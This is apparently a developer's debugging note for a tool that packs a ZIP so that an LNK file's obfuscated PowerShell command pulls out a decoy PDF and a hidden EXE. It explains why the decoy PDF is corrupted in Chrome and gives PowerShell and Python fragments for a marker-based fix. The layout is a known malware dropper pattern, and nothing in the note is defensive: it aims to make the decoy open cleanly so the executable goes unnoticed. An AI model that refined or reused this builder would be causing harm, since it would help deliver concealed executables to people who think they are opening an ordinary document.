# PDF Extraction Issue Fix

## Problem
The PDF is getting corrupted because the byte search for "PDF-" starts from the beginning of the ZIP file instead of from where the embedded data actually begins.

## Current Structure
```
[ZIP Header & Content] [Embedded PDF] [0x55555555 + EXE] [ZIP Central Directory] [EOCD]
                       ^
                       Need to start search here
```

## The Issue in Code
The current code searches from byte 0:
```powershell
${{8}}=-1;for($i=0;$i -lt (${{2}}.Length-3);$i++){{if(${{2}}[$i] -eq 80 ...
```

But the embedded data starts AFTER the original ZIP content (at the original central directory offset).

## Solution Options

### Option 1: Search from End of Original ZIP Content
We need to find where the original ZIP content ends (which is where we started embedding). This would require encoding the offset in the PowerShell command.

### Option 2: Use a Unique Marker for PDF
Add a unique marker before the PDF (like we do with 0x55555555 for the EXE).

### Option 3: Search Backwards from EXE Marker
Since we know the EXE comes after the PDF, we could:
1. Find the 0x55555555 marker
2. Search backwards from there for "PDF-"

## Quick Workaround
The issue might be that there's a "PDF-" pattern in the ZIP or LNK file itself. To test this theory:

1. Check if the extracted PDF starts with the correct PDF header
2. Compare where the search found "PDF-" vs where the actual PDF data is

## Why Firefox Works but Chrome Doesn't
- Firefox might be more lenient with corrupted PDF headers
- Chrome's PDF viewer is stricter about PDF structure
- The extracted PDF likely has garbage data at the beginning

## Recommended Fix
Modify the embedding to add a unique marker before the PDF:
```python
# In embed_secondary_data function
if pdf_to_embed_path:
    embedded_data += b'\x50\x44\x46\x00'  # PDF marker
    embedded_data += pdf_data
```

Then search for this unique marker instead of just "PDF-".
